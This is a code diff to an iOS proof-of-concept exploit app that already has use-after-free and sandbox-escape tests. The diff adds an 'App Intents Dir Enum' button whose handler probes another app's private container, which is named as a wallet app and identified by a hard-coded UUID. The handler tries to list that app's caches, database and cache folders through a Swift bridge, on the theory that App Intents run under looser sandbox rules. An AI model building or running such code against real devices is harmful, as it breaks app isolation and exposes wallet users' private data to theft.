@@ -30,6 +30,13 @@
 #include <dirent.h>
 #include <sys/stat.h>
 
+#if __has_include("UAFPoc-Swift.h")
+#import "UAFPoc-Swift.h"
+#define HAS_SWIFT_APPINTENTS 1
+#else
+#define HAS_SWIFT_APPINTENTS 0
+#endif
+
 // getattrlistbulk — private API on iOS, resolve via dlsym
 #define ATTR_BULK_REQD      0x00000080
 #define ATTR_CMN_NAME       0x00000001
@@ -207,6 +214,7 @@ static const char kOpenPropertiesGarbage[] =
 @property (nonatomic, assign) int         pfRoutePhase;
 @property (nonatomic, strong) UIButton   *iohidUAFButton;
 @property (nonatomic, strong) UIButton   *sandboxEscapeButton;
+@property (nonatomic, strong) UIButton   *appIntentButton;
 @property (nonatomic, strong) UITextView *logView;
 @property (nonatomic, assign) int  proofCrossClientEvents;
 @property (nonatomic, assign) int  proofCrossClientChecks;
@@ -723,6 +731,16 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
+    // App Intents-based directory enumeration button (v34, Swift bridge)
+    self.appIntentButton = [UIButton buttonWithType:UIButtonTypeSystem];
+    self.appIntentButton.translatesAutoresizingMaskIntoConstraints = NO;
+    UIButtonConfiguration *aiConf = [UIButtonConfiguration filledButtonConfiguration];
+    aiConf.baseBackgroundColor = [UIColor systemPurpleColor];
+    self.appIntentButton.configuration = aiConf;
+    [self.appIntentButton setTitle:@"App Intents Dir Enum v34" forState:UIControlStateNormal];
+    [self.appIntentButton addTarget:self action:@selector(appIntentTapped) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:self.appIntentButton];
+
     self.logView = [[UITextView alloc] initWithFrame:CGRectZero];
     self.logView.translatesAutoresizingMaskIntoConstraints = NO;
     self.logView.editable = NO;
@@ -748,7 +766,10 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self.sandboxEscapeButton.topAnchor constraintEqualToAnchor:self.iohidUAFButton.bottomAnchor constant:12],
         [self.sandboxEscapeButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
         [self.sandboxEscapeButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
-        [self.logView.topAnchor constraintEqualToAnchor:self.sandboxEscapeButton.bottomAnchor constant:20],
+        [self.appIntentButton.topAnchor constraintEqualToAnchor:self.sandboxEscapeButton.bottomAnchor constant:12],
+        [self.appIntentButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
+        [self.appIntentButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
+        [self.logView.topAnchor constraintEqualToAnchor:self.appIntentButton.bottomAnchor constant:20],
         [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
         [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
         [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-16],
@@ -7280,6 +7301,58 @@ static void *iohid_threadCopyEvent(void *arg) {
 // Affects iOS 26.4.2 & below — UNPATCHED on iOS 26.2
 // Public PoC — if ObjC direct path traversal works, we can read any file
 // =======================================================================
+
+#pragma mark - App Intents Directory Enumeration (v34)
+
+- (void)appIntentTapped {
+    [self appendLog:@"\n============================================================"];
+    [self appendLog:@"  App Intents Extension — Directory Enumeration Test"];
+    [self appendLog:@"  Hypothesis: App Intents XPC context has different MAC rules"];
+    [self appendLog:@"============================================================\n"];
+
+    NSMutableString *log = [NSMutableString string];
+    NSString *tpUUID = @"0D926318-FE07-4B1D-8A4B-5278C4E380D5";
+
+#if HAS_SWIFT_APPINTENTS
+    [log appendString:@"[+] Swift AppIntents bridge available\n\n"];
+    SwordAppIntentBridge *bridge = [[SwordAppIntentBridge alloc] init];
+
+    // Test 1: Enumerate TP cache dir via Swift
+    [log appendString:@"--- Swift Test 1: TP cache/global.wallet.ios ---\n"];
+    NSString *r1 = [bridge enumerateDirectory:
+        [NSString stringWithFormat:@"var/mobile/Containers/Data/Application/%@/Library/Caches/com.global.wallet.ios", tpUUID]];
+    [log appendString:r1];
+
+    // Test 2: Enumerate TP Documents/db dir
+    [log appendString:@"\n--- Swift Test 2: TP Documents/db ---\n"];
+    NSString *r2 = [bridge enumerateDirectory:
+        [NSString stringWithFormat:@"var/mobile/Containers/Data/Application/%@/Documents/db", tpUUID]];
+    [log appendString:r2];
+
+    // Test 3: Enumerate TP Documents/cache dir
+    [log appendString:@"\n--- Swift Test 3: TP Documents/cache ---\n"];
+    NSString *r3 = [bridge enumerateDirectory:
+        [NSString stringWithFormat:@"var/mobile/Containers/Data/Application/%@/Documents/cache", tpUUID]];
+    [log appendString:r3];
+
+    // Test 4: Quick probe of few known paths
+    [log appendString:@"\n--- Swift Test 4: Quick probes ---\n"];
+    NSArray *probes = @[
+        [NSString stringWithFormat:@"var/mobile/Containers/Data/Application/%@/Documents/db/", tpUUID],
+        [NSString stringWithFormat:@"var/mobile/Containers/Data/Application/%@/Documents/cache/", tpUUID],
+    ];
+    for (NSString *p in probes) {
+        [log appendFormat:@"%@\n", [bridge probePath:p]];
+    }
+
+#else
+    [log appendString:@"[-] Swift AppIntents bridge NOT available\n"];
+    [log appendString:@"    (UAFPoc-Swift.h not found — Swift not configured in build)\n"];
+    [log appendString:@"    This is expected if build.yml does not copy Swift files yet.\n"];
+#endif
+
+    dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
+}
 
 - (void)sandboxEscapeTapped {
     [self appendLog:@"\n============================================================"];
